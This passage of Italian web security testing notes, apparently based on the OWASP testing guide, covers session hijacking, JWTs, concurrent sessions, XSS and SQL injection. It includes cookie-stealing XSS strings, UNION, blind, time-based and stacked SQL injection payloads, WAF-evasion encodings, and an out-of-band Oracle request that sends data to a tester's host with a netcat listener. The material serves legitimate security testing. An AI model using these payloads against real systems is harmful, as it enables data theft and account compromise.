2. Eliminare dal cookie jar tutti i cookie che soddisfano una delle seguenti condizioni:
    * nel caso non ci sia adozione HSTS: l'attributo Secure è impostato
    * nel caso ci sia adozione parziale HSTS: l'attributo Secure è impostato o l'attributo Domain non è impostato
3. Salvare uno snapshot del cookie jar
4. Attivare la funzione sicura identificata al punto 1
5. Osservare se l'operazione al punto 4 è stata eseguita con successo. In tal caso, l'attacco ha avuto successo
6. Svuotare il cookie jar, accedere come attaccante e raggiungere la pagina al punto 1
7. Scrivere nel cookie jar, uno per uno, i cookie salvati al punto 3
8. Attivare nuovamente la funzione sicura identificata al punto 1
9. Svuotare il cookie jar e accedere nuovamente come vittima
10. Osservare se l'operazione al punto 8 è stata eseguita con successo nell'account della vittima. In tal caso, l'attacco ha avuto successo; altrimenti, il sito è sicuro contro il dirottamento della sessione
    
Si consiglia di utilizzare due macchine o browser diversi per la vittima e l'attaccante. Questo permette di diminuire il numero di falsi positivi se l'applicazione web effettua il fingerprinting per verificare l'accesso abilitato da un determinato cookie.

**Rimedi**
* Utilizza l'attributo `Secure` anche quando utilizzo connessioni HTTPS
* HSTS completo dovrebbe essere attivato sul dominio apex (dominio principale senza alcun sottodominio) per prevenire questo attacco.

#### 10 - Test per i JSON web token
I JSON Web Token (JWT) sono token JSON firmati crittograficamente, progettati per condividere affermazioni tra sistemi. Vengono frequentemente utilizzati come token di autenticazione o sessione, in particolare sulle API REST.

**Come testarlo**
I JWT sono composti da tre componenti:
* L'intestazione
* Il payload (o corpo)
* La firma

Ogni componente è codificato in base64 e sono separati da punti (.). Si noti che la codifica base64 utilizzata in un JWT rimuove i segni di uguale (=), quindi potrebbe essere necessario aggiungerli per decodificare le sezioni.

**Analisi dei contenuti**
*Intestazione*
L'intestazione definisce il tipo di token (tipicamente JWT) e l'algoritmo utilizzato per la firma. Un esempio di intestazione decodificata è mostrato di seguito:

    {
    "alg": "HS256",
    "typ": "JWT"
    }

Ci sono tre principali algoritmi utilizati per calcolare le firme: 

| Algoritmo | Descrizione                                             |
|-----------|--------------------------------------------------------|
| HSxxx     | HMAC utilizzando una chiave segreta e SHA-xxx.        |
| RSxxx e PSxxx | Firma con chiave pubblica utilizzando RSA.        |
| ESxxx     | Firma con chiave pubblica utilizzando ECDSA.          |


**Payload**
Il payload del JWT contiene i dati effettivi. Un esempio di payload è mostrato di seguito:

    {
    "username": "administrator",
    "is_admin": true,
    "iat": 1516239022,
    "exp": 1516242622
    }

Il payload non è solitamente crittografato, quindi va esaminato per determinare se contiene dati sensibili o potenzialmente inappropriati.
Questo JWT include il nome utente e lo stato amministrativo dell'utente, oltre a due affermazioni standard (iat e exp). Queste affermazioni sono definite nella RFC 7519, e un breve riassunto è fornito nella tabella sottostante:

| Affermazione | Nome Completo | Descrizione                                                        |
|--------------|---------------|--------------------------------------------------------------------|
| iss          | Emittente     | L'identità della parte che ha emesso il token.                    |
| iat          | Emesso il     | Il timestamp Unix di quando è stato emesso il token.              |
| nbf          | Non Prima     | Il timestamp Unix della data più antica in cui il token può essere utilizzato. |
| exp          | Scade         | Il timestamp Unix di quando il token scade.                       |

**Firma**
La firma è calcolata utilizzando l'algoritmo definito nell'intestazione del JWT, quindi codificata in base64 e aggiunta al token. Modificare qualsiasi parte del JWT dovrebbe invalidare la firma e far rifiutare il token dal server.

**Revisione d'uso**
Oltre ad essere crittograficamente sicuro, il JWT deve anche essere memorizzato e inviato in modo sicuro. Questo dovrebbe includere controlli che:
* Viene sempre inviato su connessioni crittografate (HTTPS).
* Se viene memorizzato in un cookie, deve essere contrassegnato con attributi appropriati.

**Verifica delle firme**
Una delle vulnerabilità più gravi riscontrate con i JWT è quando l'applicazione non verifica che la firma sia corretta. Questo di solito avviene quando uno sviluppatore utilizza una funzione come `jwt.decode()`, che decodifica semplicemente il corpo del JWT, anziché `jwt.verify()`, che verifica la firma prima di decodificare il JWT.

Questo può essere facilmente testato modificando il corpo del JWT senza cambiare nulla nell'intestazione o nella firma, inviandolo in una richiesta per vedere se l'applicazione lo accetta.

**Rimedi**
* Utilizza librerie sicure
* Assicurati che la firma sia valida e usi l'algoritmo previsto
* Usa una chiave HMAC robusta o una chiave privata unica per firmarli
* Assicurati che non ci siano informazioni sensibili esposte nel payload (o in caso, criptarle)

#### 11 - Test per le sessioni concorrenti
Questo caso di test ha l'obiettivo di valutare la capacità dell'applicazione di gestire più sessioni attive per un singolo utente.
Consentire sessioni concorrenti non è intrinsecamente dannoso e in molte applicazioni è intenzionalmente permesso. 

**Come testarlo**
1. *Generare una sessione valida* 
    * Inviare credenziali valide per iniziare una sessione
    * Conservare il cookie (o il token) di autenticazione generato 
2. *Test per le sessioni attive*
    * Tentare di creare più cookie di autenticazione inviando richieste di accesso (ad esempio, cento volte).

    Nota: Utilizzare la modalità di navigazione privata o i contenitori multi-account può essere utile per condurre questi test, poiché possono fornire ambienti separati per testare la gestione delle sessioni senza interferenze da sessioni o cookie esistenti nel browser.
3. *Test per validare sessioni attive*
    * Provare ad accedere all'applicazione usando il tokenb di sessione iniziale.
    * Se l'autenticazione ha successo con il primo token generato, considerare questo un potenziale problema che indica una gestione inadeguata delle sessioni.

**Rimedio**
L'applicazione dovrebbe monitorare e limitare il numero di sessioni attive per account utente. Se il numero massimo di sessioni consentite viene superato, il sistema deve invalidare le sessioni precedenti per mantenere la sicurezza.
Può essere utile anche:
* **Monitorare gli indirizzi IP**: Tracciare gli indirizzi IP degli utenti che accedono ad un account e segnalare eventuali attività sospette, come accessi multipli da località diverse
* **Restrizione sugli indirizzi IP**: Consentire agli utenti di specificare indirizzi IP o intervalli fidati da cui possono accedere ai propri account, aumentando la sicurezza limitando le sessioni a posizioni note e approvate.

### G - Test della validazione degli input
#### 1 - Testare per il Cross Site Scripting Riflesso
Il Cross-Site Scripting riflesso (XSS) si verifica quando un attaccante inietta codice eseguibile nel browser all'interno di una singola risposta HTTP. L'attacco non è memorizzato nell'applicazione e colpisce solo gli utenti che aprono un link o una pagina web maliziosamente costruita. 
Gli XSS riflessi sono i tipi di attacco XSS più frequenti. 
Se un'applicazione web accetta input non sicuro e lo mostra nella risposta senza adeguate misure di sicurezza, gli attaccanti possono iniettare codice eseguibile, che verrà eseguito nel contesto del browser della vittima. 

**Come testarlo**
**Black box**
Ci sono almeno tre fasi:
* **Rilevamento dei vettori di ingresso**: Per ogni pagina web, il tester deve determinare tutte le variabili definite dall'utente dell'applicazione web e come inserirle. Si intendono i parametri nei link, dati nei moduli o valori nei campi nascosti.
* **Analizzare i vettori d'ingresso**: Per rilevare una vulnerabilità XSS, il tester utilizzerà in genere dati di input appositamente creati per ogni vettore di input. Tali dati di input sono in genere innocui, ma attivano risposte dal browser web che manifestano la vulnerabilità. I dati di test possono essere generati utilizzando un fuzzer per applicazioni web, un elenco automatico predefinito di stringhe di attacco note o manualmente.
    Alcuni esempi sono:
    * `<script>alert(123)</script>`: Questo è un semplice script che mostra un alert nel browser con il numero 123. Se un attaccante riesce a iniettare questo codice in una pagina web vulnerabile (ad esempio, se il sito restituisce questo input non filtrato), quando un utente carica la pagina, il codice verrà eseguito nel suo browser, mostrando l'alert.
    * `><script>alert(document.cookie)</script>`: Qui abbiamo un esempio più sofisticato. Questo payload inizia con ">, che potrebbe essere utilizzato per chiudere un tag HTML (come un attributo di input o di un tag div) e inizia un nuovo tag `<script>`. Quando questo codice viene eseguito, mostrerà un alert contenente i cookie della pagina corrente, grazie alla funzione document.cookie. Se l'attaccante riesce a ottenere i cookie, potrebbe rubare sessioni dell'utente o altre informazioni sensibili.

    Per altri comandi usabili per i test visitare la pagina [XSS Filter Evasion Cheat Sheet](https://owasp.org/www-community/xss-filter-evasion-cheatsheet).
* **Verifica dell'impatto**: Per ogni input di test tentato nella fase precedente, il tester analizza il risultato e determina se rappresenta una vulnerabilità che ha un impatto realistico sulla sicurezza dell'applicazione web. Una volta trovato, il tester identifica tutti i caratteri speciali che non sono stati correttamente codificati, sostituiti o filtrati. Idealmente, tutti i caratteri speciali HTML saranno sostituiti con entità HTML. Le entità HTML chiave da identificare sono:
    * `>` diventa `&gt;`
    * `<` diventa `&lt;`
    * & diventa `&amp;`
    * `'` diventa `&apos;` o `&#39;`
    * `"` diventa `&quot;`

    Stessa cosa con i JavaScript.

**Bypassare i filtri XSS**
Gli sviluppatori hanno a disposizione diversi meccanismi per la sanificazione, come la restituzione di un errore, la rimozione, la codifica o la sostituzione di input non validi. Un elenco di negazione potrebbe non includere tutte le possibili stringhe di attacco, un elenco di permessi potrebbe essere eccessivamente permissivo, la sanitizzazione potrebbe fallire o un tipo di input potrebbe essere erroneamente attendibile e rimanere non sanitizzato. Tutti questi elementi consentono agli aggressori di aggirare i filtri XSS.

Per vedere tutti gli esempi di come un attaccante può introdurre codice malevolo, controllare il [link](https://github.com/OWASP/wstg/blob/master/document/4-Web_Application_Security_Testing/07-Input_Validation_Testing/01-Testing_for_Reflected_Cross_Site_Scripting.md).

**White box**
Controllare il codice come riceve gli input.

**Rimedi**
* Sanifica l'input prima di inserirlo nelle variabili corrispondenti o nel database (anche tramite l'utilizzo di whitelist)
* Codificare l'output per garantire che i caratteri speciali vengano visualizzati come testo normale. Ad esempio, utilizzare `&lt;` per <, `&gt;` per > e così via, per prevenire l'inserimento di codice javascript all'interno del proprio codice.
* Abilitare l'intestazione X-XSS-Protection nel server per attivare i filtri XSS dei browser.

#### 2 - Test per il cross site scripting persistente
Il Cross-site Scripting (XSS) persistente è il tipo più pericoloso di Cross Site Scripting. Le applicazioni web che consentono agli utenti di memorizzare dati sono potenzialmente esposte a questo tipo di attacco. 
L'XSS persistente si verifica quando un'applicazione web raccoglie input da un utente che potrebbe essere malevolo e poi memorizza tale input in un database per un uso successivo. L'input memorizzato non viene filtrato correttamente. Di conseguenza, i dati malevoli appariranno come parte del sito e verranno eseguiti nel browser dell'utente con i privilegi dell'applicazione web (un esempio sono i commenti su un social, dopo aver commentato il browser apre il contenuto anche se malevolo in assenza di filtri).
Questo tipo di attacco può essere sfruttato anche con framework di sfruttamento del browser come [BeEF](https://beefproject.com/) e [XSS Proxy](http://xss-proxy.sourceforge.net/). Questi framework consentono lo sviluppo di exploit JavaScript complessi.

**Come testarlo**
**Black box**
Il processo per identificare vulnerabilità XSS memorizzate è simile a quello descritto durante il test per XSS riflessi.
Il primo passo è identificare tutti i punti in cui l'input dell'utente viene memorizzato nel backend e poi visualizzato dall'applicazione.

*Anlizza il Codice HTML*
Tutte le aree dell'applicazione accessibili dagli amministratori dovrebbero essere testate per identificare la presenza di dati inviati dagli utenti.
<br>

*Testare per XSS persiistente*
Va controllata la validazione degli input e il filtraggio dell'applicazione web.
Provare ad inserire per esempio:
* `aaa@aa.com&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;`, ovvero aaa@aa.com&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;
* `aaa@aa.com%22%3E%3Cscript%3Ealert(document.cookie)%3C%2Fscript%3E`

Se l'attacco va a segno dovremmo ottenere una finestra di allert con il valore dei cookies.

Esistono molte tecniche per evitare i filtri di input, dunque è fortemente raccomandato che i tester leggano [Evitare i filtri XSS](https://owasp.org/www-community/xss-filter-evasion-cheatsheet) e [Mario XSS Cheta pages](https://cybersecurity.wtf/encoder/)

*Sfruttare l'XSS persistente con Beef*

*Upload di file* 
Se l'applicazione web consente il caricamento di file, è importante verificare se è possibile caricare contenuti HTML o di testo. Questo non deve essere possibile.

#### 3 - Testing per l'iniezione SQL
Il test di SQL injection verifica se è possibile iniettare dati in un'applicazione/sito in modo che venga eseguita una query SQL controllata dall'utente nel database.
L'esploitazione riuscita di questa classe di vulnerabilità consente a un utente non autorizzato di accedere o manipolare i dati nel database.Un esempio di query dinamica è 

    select title, text from news where id=$id

dove $id è l'input dell'utente.
A causa del modo in cui è stata costruita, l'utente può fornire un input studiato cercando di far eseguire alla dichiarazione SQL originale ulteriori azioni a scelta dell'utente. L'esempio seguente illustra i dati forniti dall'utente "10 or 1=1", cambiando la logica della dichiarazione SQL, modificando la clausola WHERE aggiungendo una condizione "or 1=1".

    select title, text from news where id=10 or 1=1

Fai attenzione nel testare questo: se la stessa query è usata inUPDATE o DELETE potresti cancellare o modificare cose indesiderate.

Esistno tre tipi di attacchi SQL injection:
* **Inband**: i dati sono recuperati direttamente dalla pagina web
* **Out of band**: i dati vengono recuperati attraverso un canale diverso come per esempio una mail
* **Blind**: non c'è un trasferimento reale di dati ma il tester può recuperare informazioni dal comportamento del server

Le cinque tecnche più comuni per sfruttare l'SQL injection sono:
* **Operatore Union**: se ho la vulnerabilità in un SELECT, poosso scrivere con UNION un'altra query.
* **Boolean**: utilizza condizioni booleane per verificare se determinate condizioni sono vere o false.
* **Basata su un errore**: questa tecnica costringe il database a generare un errore, fornendo all'attaccante o al tester informazioni su cui perfezionare la propria iniezione.
* **Out-of-band**
* **Ritardo temporale**: se non si riesce ad ottenere alcuna informazine in altri modi, con query tipo 

        SELECT * FROM utenti WHERE username = '' OR (SELECT IF((SELECT COUNT(*) FROM utenti WHERE username='admin') > 0, SLEEP(5), 0)) -- AND password = 'input_password';

    posso sapere informazioni sul database.

**Come testarlo**
**Tecniche di rilevamento**
Il primo passo in questo test è comprendere quando l'applicazione interagisce con un server DB per accedere a dei dati. 

Il tester deve fare un elenco di tutti i campi di input i cui valori potrebbero essere utilizzati per costruire una query SQL, inclusi i campi nascosti delle richieste POST, e poi testarli separatamente, cercando di interferire con la query e generare un errore.

Il primo test consiste solitamente nell'aggiungere un apostrofo `'` (terminatore di stringa) o un punto e virgola `;`(terminatore di istruzione) al campo o parametro in test.
Anche i delimitatori di commento (-- o /* */, ecc.) e altre parole chiave SQL come AND e OR possono essere utilizzati per cercare di modificare la query.
Una tecnica molto semplice ma a volte ancora efficace è semplicemente inserire una stringa dove è previsto un numero.

**Test standard per gli SQL injection**
*SQL injection classico*
Consideriamo questa query

    SELECT * FROM Users WHERE Username='$username' AND Password='$password'

Se invece che username e password noi mettiamo

    SELECT * FROM Users WHERE Username='1' OR '1' = '1' AND Password='1' OR '1' = '1'

Se i parametri sono inviati al server tramite un GET dal sito `www.example.com`, la richiesta sarà 

    http://www.example.com/index.php?username=1'%20or%20'1'%20=%20'1&amp;password=1'%20or%20'1'%20=%20'1


*SELECT statement*
Consideriamo 

    SELECT * FROM products WHERE id_product=$id_product

Che è inviata al server tramite la richiesta 

    http://www.example.com/product.php?id=10

Quando il tester prova un valore valido (ad esempio 10 in questo caso), l'applicazione restituirà la descrizione di un prodotto. Un buon modo per testare se l'applicazione è vulnerabile in questo scenario è giocare con la logica, usando gli operatori AND e OR.
Considera:

    SELECT * FROM products WHERE id_product=10 AND 1=2

In questo caso, probabilmente l'applicazione restituirà un messaggio che dice che non ci sono contenuti disponibili o una pagina vuota. Poi il tester può inviare una dichiarazione vera e controllare se c'è un risultato valido:

    http://www.example.com/product.php?id=10 AND 1=1

Se l'applicazione risponde in modo diverso alle due query vuol dire che non sta essendo filtrata in modo corretto e che è vulnerabile ad attacchi via SQL injection.

*Stacked queries*
A seconda dell'API utilizzata dall'applicazione web e dal DBMS, potrebbe essere possibile eseguire più query in un'unica chiamata.
Considera questo:

    SELECT * FROM products WHERE id_product=$id_product

Un modo per sfruttare lo scenario sopra descritto sarebbe:

    http://www.example.com/product.php?id=10; INSERT INTO users (…)

In questo modo sarebbe possibile eseguire più query una dopo l'altra.

**Fingerprinting del database**
*Errori restituiti dall'applicazione*
Il primo modo per scoprire quale database backend viene utilizzato è osservare l'errore restituito dall'applicazione. 

    You have an error in your SQL syntax; check the manual
    that corresponds to your MySQL server version for the
    right syntax to use near '\'' at line 1

Un completo UNION SELECT con version() può anche aiutare a conoscere il database backend.

    SELECT id, name FROM users WHERE id=1 UNION SELECT 1, version() limit 1,1

Se non c'è alcun messaggio di errore o un messaggio di errore personalizzato, il tester può provare a iniettarlo in campi di stringa utilizzando varie tecniche di concatenazione:
* MySql: ‘test’ + ‘ing’
* SQL Server: ‘test’ ‘ing’
* Oracle: ‘test’||’ing’
* PostgreSQL: ‘test’||’ing’

**Tecniche di sfruttamento**
*Tecniche di sfruttamento con UNION*
Supponiamo che la query eseguita dal server sia la seguente:

    SELECT Name, Phone, Address FROM Users WHERE Id=$id

Noi inseriremo in `&id`:

    SELECT Name, Phone, Address FROM Users WHERE Id=1 UNION ALL SELECT creditCardNumber,1,1 FROM CreditCardTable

La parola chiave ALL è necessaria per aggirare le query che utilizzano la parola chiave DISTINCT. 

Il primo dettaglio che un tester deve trovare per sfruttare la vulnerabilità di iniezione SQL utilizzando questa tecnica è il numero corretto di colonne nella dichiarazione SELECT.

Per raggiungere questo obiettivo, il tester può utilizzare la clausola ORDER BY seguita da un numero che indica la numerazione della colonna selezionata nel database:

    http://www.example.com/product.php?id=10 ORDER BY 10--

Se la query viene eseguita con successo, il tester può assumere in questo esempio che ci siano 10 o più colonne nella dichiarazione SELECT. Se la query fallisce, allora devono esserci meno di 10 colonne restituite dalla query. 

Dopo che il tester ha scoperto il numero di colonne, il passo successivo è determinare il tipo di colonne. Supponendo che ci siano 3 colonne nell'esempio sopra, il tester potrebbe provare ciascun tipo di colonna, utilizzando il valore NULL per aiutarli:

    http://www.example.com/product.php?id=10 UNION SELECT 1,null,null--

Se la query fallisce, il tester probabilmente vedrà un messaggio come:

    All cells in a column must have the same datatype

Se la query viene eseguita con successo, la prima colonna può essere un intero. Allora il tester può continuare e così via:

    http://www.example.com/product.php?id=10 UNION SELECT 1,1,null--

Dopo la raccolta di informazioni di successo, a seconda dell'applicazione, potrebbe mostrare solo il primo risultato al tester, poiché l'applicazione tratta solo la prima riga del set di risultati. In questo caso, è possibile utilizzare una clausola LIMIT oppure il tester può impostare un valore non valido, rendendo valida solo la seconda query (supponendo che non ci sia un'entrata nel database che abbia un ID pari a 99999):
* **LIMIT**: La clausola LIMIT permette di specificare quanti risultati vuoi visualizzare. Ad esempio, usando LIMIT 1 nella query, il tester potrebbe forzare l'applicazione a mostrare solo il primo record, mentre con LIMIT 2 potrebbe visualizzare i primi due record, e così via. Questo è utile se il tester vuole vedere più risultati alla volta.
* **Impostare un valore non valido**: e il tester inserisce un valore che non esiste nel database, come un ID 99999 che non corrisponde a nessun record, l'applicazione restituirà un errore o nessun risultato per la query principale. Tuttavia, la parte UNION della query (che è valida) verrà comunque eseguita. In questo modo, l'applicazione restituirà solo i risultati della query UNION. 

        http://www.example.com/product.php?id=99999 UNION SELECT 1,1,null--

*Alcune volte la tecnica UNION può non funzionare: in questa tecnica, commenti il resto della query dopo il tuo payload UNION. Va bene per query normali, ma in query più complicate può risultare problematico. Se la prima parte della query dipende dalla seconda, commentare il resto interrompe la query originale (Query con sub-query al loro interno; non uso il risultato così com'è ma uso alias o dichiarazione di variabili; il risultato della prima query è usato in una seconda; il parmetro malevolo inserito è usato in altre query).*
    
*Tecnica di sfruttamento booleano*
La tecnica di sfruttamento booleano è molto utile quando il tester si trova di fronte a una situazione di Blind SQL Injection, in cui non si conosce l'esito di un'operazione. Ad esempio, questo comportamento si verifica nei casi in cui il programmatore ha creato una pagina di errore personalizzata che non rivela nulla sulla struttura della query o del database. 
Utilizzando metodi di inferenza, è possibile superare questo ostacolo e quindi riuscire a recuperare i valori di alcuni campi desiderati. Questo metodo consiste nel condurre una serie di query booleane contro il server, osservando le risposte e infine deducendo il significato di tali risposte. 
Considero la seguente richiesta:

    http://www.example.com/index.php?id=1'
    
Ottenendo una pagina con un messaggio di errore personalizzato dovuto a un errore sintattico nella query. Supponiamo che la query eseguita sul server sia:

    SELECT field1, field2, field3 FROM Users WHERE Id='$Id'

Ciò che vogliamo ottenere è il valore del campo username, estraendo tale valore carattere per carattere. 
Usiamo le seguenti funzioni:
* SUBSTRING(text, start, lenght)
* ASCII(char)
* LENGHT(text)

Attraverso tali funzioni, eseguiremo i nostri test sul primo carattere e, quando avremo scoperto il valore, passeremo al secondo e così via, fino a scoprire l'intero valore. I test sfrutteranno la funzione SUBSTRING per selezionare solo un carattere alla volta (selezionare un singolo carattere significa impostare il parametro di lunghezza a 1) e la funzione ASCII per ottenere il valore ASCII, in modo da poter effettuare un confronto numerico. 

    $Id=1' OR ASCII(SUBSTRING(username,1,1))=97 AND '1'='1

Che crea la seguente query (da ora in poi la chiameremo "query inferenziale"):

    SELECT field1, field2, field3 FROM Users WHERE Id='1' OR ASCII(SUBSTRING(username,1,1))=97 AND '1'='1'

L'esempio precedente restituisce un risultato se e solo se il primo carattere del campo username è uguale al valore ASCII 97.
Se otteniamo un valore falso, aumentiamo l'indice della tabella ASCII da 97 a 98 e ripetiamo la richiesta. 

Il problema è capire come possiamo distinguere i test che restituiscono un valore vero da quelli che restituiscono un valore falso. Per fare ciò, creiamo una query che restituisce sempre falso. Questo è possibile utilizzando il seguente valore per Id:

    $Id=1' AND '1' = '2

La risposta ottenuta dal server (ossia codice HTML) sarà il valore falso per i nostri test. 

A volte, questo metodo non funziona. Se il server restituisce due pagine diverse come risultato di due richieste web identiche e consecutive, non saremo in grado di discriminare il valore vero da quello falso. In questi casi particolari, è necessario utilizzare filtri specifici che ci permettano di eliminare il codice che cambia tra le due richieste e ottenere un template.

Nella discussione precedente, non abbiamo affrontato il problema di determinare la condizione di terminazione per i nostri test, ovvero quando dovremmo terminare la procedura di inferenza. Una tecnica per farlo utilizza una caratteristica della funzione SUBSTRING e della funzione LENGTH. Quando il test confronta il carattere corrente con il codice ASCII 0 (cioè il valore nullo) e il test restituisce il valore vero, allora o abbiamo completato la procedura di inferenza (abbiamo esaminato l'intera stringa), oppure il valore che abbiamo analizzato contiene il carattere nullo.
Inseriremo il seguente valore per il campo Id:

    $Id=1' OR LENGTH(username)=N AND '1' = '1

L'attacco di SQL injection cieca richiede un alto volume di query. Il tester potrebbe aver bisogno di uno strumento automatico per sfruttare la vulnerabilità.

*Tecnica di sfruttamento basata su errori*
La tecnica basata su errori consiste nel costringere il database a eseguire un'operazione che produce un errore come risultato. L'obiettivo qui è cercare di estrarre alcuni dati dal database e mostrarli nel messaggio di errore.
Consideriamo:

    SELECT * FROM products WHERE id_product=$id_product

Consideriamo anche la richiesta a uno script che esegue la query sopra:

    http://www.example.com/product.php?id=10
    
La richiesta malevola sarebbe (ad esempio per Oracle 10g):

    http://www.example.com/product.php?id=10||UTL_INADDR.GET_HOST_NAME( (SELECT user FROM DUAL) )--

In questo esempio, il tester sta concatenando il valore 10 con il risultato della funzione UTL_INADDR.GET_HOST_NAME. Questa funzione di Oracle tenterà di restituire il nome host del parametro passato, che è un'altra query, il nome dell'utente. Quando il database cerca un nome host con il nome del database utente, fallirà e restituirà un messaggio di errore come:

    ORA-292257: host SCOTT unknown

Il tester può quindi manipolare il parametro passato alla funzione GET_HOST_NAME() e il risultato verrà mostrato nel messaggio di errore.

*Tecnica di sfruttamento out-of-band*
Questa tecnica è molto utile quando il tester si imbatte in una situazione di Blind SQL Injection, in cui non si conosce l'esito di un'operazione.
Consiste nell'uso di funzioni DBMS per stabilire una connessione out-of-band e inviare i risultati della query iniettata al server del tester.
Come nelle tecniche basate sugli errori, ogni DBMS ha le sue funzioni. 
Considera la seguente query SQL:

    SELECT * FROM products WHERE id_product=$id_product

E la richiesta a uno script che esegue la query sopra:

    http://www.example.com/product.php?id=10

La richiesta malevola sarebbe:

    http://www.example.com/product.php?id=10||UTL_HTTP.request(‘testerserver.com:80’||(SELECT user FROM DUAL)--

In questo esempio, il tester concatena il valore 10 con il risultato della funzione UTL_HTTP.request. Questa funzione Oracle tenterà di connettersi a testerserver e fare una richiesta HTTP GET contenente il risultato della query SELECT user FROM DUAL. Il tester può configurare un server web (es. Apache) o usare lo strumento Netcat:

    /home/tester/nc –nLp 80

    GET /SCOTT HTTP/1.1
    Host: testerserver.com
    Connection: close

*Tecnica di sfruttamento del ritardo temporale*
La tecnica di sfruttamento del ritardo di tempo è molto utile quando il tester si trova in una situazione di Blind SQL Injection, in cui non si conosce nulla riguardo all'esito di un'operazione. 
Questa tecnica consiste nell'inviare una query iniettata e, nel caso in cui la condizione sia vera, il tester può monitorare il tempo impiegato dal server per rispondere. Se c'è un ritardo, il tester può assumere che il risultato della query condizionale sia vero. 

Consideriamo la seguente query SQL:

    SELECT * FROM products WHERE id_product=$id_product

Consideriamo anche la richiesta a uno script che esegue la query sopra:

    http://www.example.com/product.php?id=10
    
La richiesta malevola sarebbe (ad esempio, per MySql 5.x):

    http://www.example.com/product.php?id=10 AND IF(version() like '5%', sleep(10), 'false')--

In questo esempio, il tester sta verificando se la versione di MySql è 5.x o meno, causando un ritardo di risposta dal server di 10 secondi.

*Iniezione delle procedure memorizzate*
Quando si utilizza SQL dinamico all'interno di una stored procedure, l'applicazione deve sanitizzare adeguatamente l'input dell'utente per eliminare il rischio di iniezione di codice.

Considera la seguente Stored Procedure di SQL Server:

    Create procedure user_login @username varchar(20), @passwd varchar(20)
    As
    Declare @sqlstring varchar(250)
    Set @sqlstring  = ‘
    Select 1 from users
    Where username = ‘ + @username + ‘ and passwd = ‘ + @passwd
    exec(@sqlstring)
    Go

Input dell'utente:

    anyusername or 1=1'
    anypassword

Questa procedura non sanitizza l'input, consentendo così al valore di ritorno di mostrare un record esistente con questi parametri.

Questo esempio potrebbe sembrare improbabile a causa dell'uso di SQL dinamico per effettuare il login di un utente, ma considera una query di reportistica dinamica in cui l'utente seleziona le colonne da visualizzare. L'utente potrebbe inserire codice malevolo in questo scenario e compromettere i dati.

    Create procedure get_report @columnamelist varchar(7900)
    As
    Declare @sqlstring varchar(8000)
    Set @sqlstring  = ‘
    Select ‘ + @columnamelist + ‘ from ReportTable‘
    exec(@sqlstring)
    Go

Input dell'utente:

    1 from users; update users set password = 'password'; select *

Questo porterà all'esecuzione del report e all'aggiornamento delle password di tutti gli utenti.

*Sfruttamento automatizzato*
La maggior parte delle situazioni e delle tecniche presentate qui possono essere eseguite in modo automatizzato utilizzando alcuni strumenti. In questo articolo, il tester può trovare informazioni su come eseguire audit automatizzati utilizzando [SQLMap](https://wiki.owasp.org/index.php/Automated_Audit_using_SQLMap).

*Tecnche di evasione delle firme di SWL injection*
Queste tecniche vengono utilizzate per eludere difese come i firewall per applicazioni web (WAF) o i sistemi di prevenzione delle intrusioni (IPS). Si fa anche riferimento a https://owasp.org/www-community/attacks/SQL_Injection_Bypassing_WAF.

* **Spazi bianchi**: Eliminare spazi o aggiungere spazi che non influenzano l'istruzione SQL. 

        or 'a'='a'

        or 'a'  =    'a'

    Aggiungere caratteri speciali come una nuova riga o un tab che non cambiano l'esecuzione dell'istruzione SQL. Ad esempio:

        or
        'a'=
                'a'

* **Byte nulli**: Utilizzare il byte nullo (%00) prima di qualsiasi carattere che il filtro sta bloccando.
Ad esempio, se l'attaccante può iniettare il seguente SQL:

        ' UNION SELECT password FROM Users WHERE username='admin'--

    per aggiungere byte nulli, sarà:

        %00' UNION SELECT password FROM Users WHERE username='admin'--

* **Comment SQL**: Aggiungere commenti inline SQL può anche aiutare a rendere la dichiarazione SQL valida e aggirare il filtro per l'iniezione SQL. Prendi come esempio questa iniezione SQL:

        ' UNION SELECT password FROM Users WHERE name='admin'--

    Aggiungendo commenti inline SQL sarà:

        '/**/UNION/**/SELECT/**/password/**/FROM/**/Users/**/WHERE/**/name/**/LIKE/**/'admin'--

        '/**/UNI/**/ON/**/SE/**/LECT/**/password/**/FROM/**/Users/**/WHE/**/RE/**/name/**/LIKE/**/'admin'--

* **Codifica URL**: Utilizza un servizio di codifica URL online per codificare la dichiarazione SQL:

        ' UNION SELECT password FROM Users WHERE name='admin'--

    La codifica URL della dichiarazione di iniezione SQL sarà:

        %27%20UNION%20SELECT%20password%20FROM%20Users%20WHERE%20name%3D%27admin%27--

* **Codifica di caratteri**: La funzione Char() può essere utilizzata per sostituire i caratteri inglesi. Ad esempio, char(114,111,111,116) significa "root".

        ' UNION SELECT password FROM Users WHERE name=char(114,111,111,116)--

* **Concatenazione di stringhe**: La concatenazione rompe le parole chiave SQL e elude i filtri. La sintassi della concatenazione varia in base al motore del database. Prendiamo come esempio il motore MS SQL.

        select 1

    Questa istruzione si può modificare utilizzando questa concatenazione:

        EXEC('SEL' + 'ECT 1')

* **Codifica esadecimale**: La tecnica di codifica esadecimale utilizza la codifica esadecimale per sostituire il carattere originale dell'istruzione SQL. Ad esempio, "root" può essere rappresentato come 726F6F74.

        Select user from users where name = 726F6F74

    oppure 

        Select user from users where name = unhex('726F6F74')

* **Dichiarare variabili**: Dichiara lo statement SQL in una variabile ed eseguila

    Definisci lo statement nella variabile SQLivar

        ; declare @SQLivar nvarchar(80); set @myvar = N'UNI' + N'ON' + N' SELECT' + N'password');
        EXEC(@SQLivar)

* **Espressioni alternative di '1 = 1'**

        OR 'SQLi' = 'SQL'+'i'
        OR 'SQLi' &gt; 'S'
        or 20 &gt; 1
        OR 2 between 3 and 1
        OR 'SQLi' = N'SQLi'
        1 and 1 = 1
        1 || 1 = 1
        1 && 1 = 1      

*Iniezione di Wildcard SQL*
La maggior parte dei dialetti SQL supporta sia i caratteri jolly a singolo carattere (di solito "?" o "_") che quelli a più caratteri (di solito "%" o "*"), che possono essere utilizzati nelle query con l'operatore LIKE. Anche quando vengono utilizzati controlli appropriati (come parametri o dichiarazioni preparate) per proteggere contro gli attacchi di iniezione SQL, potrebbe essere possibile iniettare caratteri jolly nelle query.

**Rimedio**
* Far riferimento al [CheatScheet sulla prevenzione delle SQL Injecton](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)
* Per garantire la sicurezza del server SQL, consulta la [CheatSheet sulla Sicurezza del Database](https://cheatsheetseries.owasp.org/cheatsheets/Database_Security_Cheat_Sheet.html)

**Rimedi**
